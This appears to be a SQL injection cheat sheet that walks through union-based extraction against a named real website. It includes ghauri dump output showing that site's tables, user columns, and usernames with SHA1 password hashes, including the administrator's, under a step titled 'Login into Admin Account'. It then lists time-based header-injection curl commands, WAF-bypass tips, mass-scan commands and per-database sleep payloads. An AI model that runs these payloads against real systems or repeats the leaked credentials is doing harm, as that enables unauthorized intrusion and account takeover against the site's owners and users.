
[+] Tips & Best Practices
 * Always test for different SQL database types (MySQL, PostgreSQL, Oracle, MSSQL)
 * Use time-based payloads when blind SQL injection is suspected
 * Test all input parameters, including headers and cookies
 * Start with low-risk payloads before increasing complexity
 * Monitor response times carefully for time-based injections
 * Document all findings and successful payloads
 * Use different encoding techniques to bypass WAF
 * Always get proper authorization before testing
 * Test numeric parameters with specific numeric-based payloads
 * Try different comment syntax for different databases
 * Use database-specific functions for more accurate detection
 * Combine multiple techniques when basic payloads fail

[+] https://floppydata.com/
[+] https://nav1n0x.gitbook.io/a-guide-to-manually-hunting-sql-injection
[+] https://addons.mozilla.org/en-US/firefox/addon/maxs-hackbar/
[+] https://freedium.cfd/https://infosecwriteups.com/waf-bypass-masterclass-using-sqlmap-with-proxychains-and-tamper-scripts-against-cloudflare-9d46b36bae94
[+] https://github.com/ifconfig-me/SQLi-Scanner

===================================================================================================================

Step 1: Identify Vulnerable Parameters
https://www.revel.com.hk/en/product.php?id=152&pid=61'

Step 2: Find the Number of Columns
https://www.revel.com.hk/en/product.php?id=152&pid=61+ORDER+BY+20--+-

Step 3: Find Displayed Columns
https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-

Step 4: Extract Database Information
https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,@@version,17,database(),19,20--+-
https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,user(),17,database(),19,20--+-

Step 5: Extract Tables
https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,CONVERT(GROUP_CONCAT(table_name)+USING utf8mb4),17,18,19,20+FROM+information_schema.tables+WHERE+table_schema=database()--+-             

Step 6: Extract Columns from a Table
https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,CONVERT(GROUP_CONCAT(column_name)+USING utf8mb4),17,18,19,20+FROM+information_schema.columns+WHERE+table_name=0x757372--+-   

Step 7: Extract Data from the Table
https://www.revel.com.hk/en/product.php?id=152&pid=61+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,CONVERT(GROUP_CONCAT(usr_name,0x3a,usr_pwd)+USING utf8mb4),17,18,19,20+FROM+usr--+-

Step 8: Login into Admin Account
Administrator:afbf4681fe8c7352b21c09187b4be6a09574afdb - Possible algorithms: SHA1 

Text2Hex: https://magictool.ai/tool/text-to-hex-converter/

===================================================================================================================

ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' --batch --dbs --level 3 --confirm
available databases [3]:
[*] revel
[*] information_schema
[*] test
ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' -D revel --tables
Database: revel
[14 tables]
+----------------------+
| verse                |
| usr                  |
| album_cate           |
| calendar_desc        |
| attachment           |
| album                |
| banner               |
| news_cate            |
| webpage_content_desc |
| calendar_pdf         |
| webpage_content      |
| news                 |
| calendar_cate        |
| calendar             |
+----------------------+
ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' -D revel -T usr --columns
Database: revel
Table: usr
[24 columns]
+--------------------+
| usr_id             |
| usr_lv             |
| usr_crt_dt         |
| usr_crt_ip         |
| usr_crt_usr_id     |
| usr_mod_dt         |
| usr_mod_ip         |
| usr_mod_usr_id     |
| usr_last_login_dt  |
| usr_last_login_ip  |
| usr_login_fail_ip  |
| usr_login_fail_dt  |
| usr_login_fail_ct  |
| usr_sort_lv        |
| usr_sort_id        |
| usr_fixed          |
| usr_st             |
| usr_login_name     |
| usr_name           |
| usr_email          |
| usr_pwd            |
| usr_pwd_mod_dt     |
| usr_pwd_mod_ip     |
| usr_pwd_mod_usr_id |
+--------------------+
ghauri -u 'https://www.revel.com.hk/en/product.php?id=152&pid=61' -D revel -T usr -C usr_name,usr_pwd --dump
Database: revel
Table: usr
[5 entries]
+---------------+------------------------------------------+
| usr_name      | usr_pwd                                  |
+---------------+------------------------------------------+
| Administrator | afbf4681fe8c7352b21c09187b4be6a09574afdb |
| EastTech      | a8372857cda513645e8e8494badc0db4aba94972 |
| SystemCreate  | <blank_value>                            |
| UserModify    | <blank_value>                            |
| Init          | <blank_value>                            |
+---------------+------------------------------------------+
[+] SHA1 : a8372857cda513645e8e8494badc0db4aba94972 

===================================================================================================================

[+] Mass SQL injection testing using ghauri
ghauri -m sql.txt --batch --dbs --level 3 --confirm

[+] Mass SQL injection testing using sqlmap
sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent

[+] Testing for time-based SQL injection via User-Agent header
curl -s -H 'User-Agent: 'XOR(if(now()=sysdate(),sleep(5),0))XOR' --url 'https://example.com'

[+] Testing for time-based SQL injection via X-Forwarded-For header
curl -s -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' --url 'https://example.com'

[+] Testing for time-based SQL injection via Referer header
curl -s -H 'Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'' --url 'https://example.com'

[+] Alternative User-Agent based SQL injection test
curl -v -A 'Mozilla/5.0', (select*from(select(sleep(20)))a) # 'http://example.com'

[+] User-Agent header-based MySQL time-based injection
curl -H 'User-Agent: XOR(if(now()=sysdate(),sleep(5),0))XOR' -X GET 'https://example.com'

[+] X-Forwarded-For header-based MySQL time-based injection
curl -H 'X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z' -X GET 'https://example.com'

[+] Referer header-based MySQL time-based injection
curl -H 'Referer: https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'' -X GET 'https://example.com'

===================================================================================================================

ghauri -m targets.txt --batch --dbs --level 3 --confirm --technique T
ghauri -m targets.txt --batch --dbs --level 3 --confirm --technique T --threads 10

===================================================================================================================

Oracle database time-based injection payload
SELECT dbms_pipe.receive_message(('a'),10) FROM dual

Microsoft SQL Server time-based injection payload
WAITFOR DELAY '0:0:10'

PostgreSQL time-based injection payload
SELECT pg_sleep(10)

MySQL time-based injection payload
SELECT sleep(10)

MySQL alternative time-based payload with URL encoding
0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z

PostgreSQL complex time-based injection payload
'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1

MySQL multi-condition time-based payload with comment bypass
if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR''XOR(if(now()=sysdate(),sleep(10),0))OR'*/

Combined MySQL and MSSQL time-based payload
1234 AND SLEEP(10)';WAITFOR DELAY '00:00:05';--

Numeric parameter time-based injection payload
paramname=1'-IF(1=1,SLEEP(10),0) AND paramname='1

===================================================================================================================


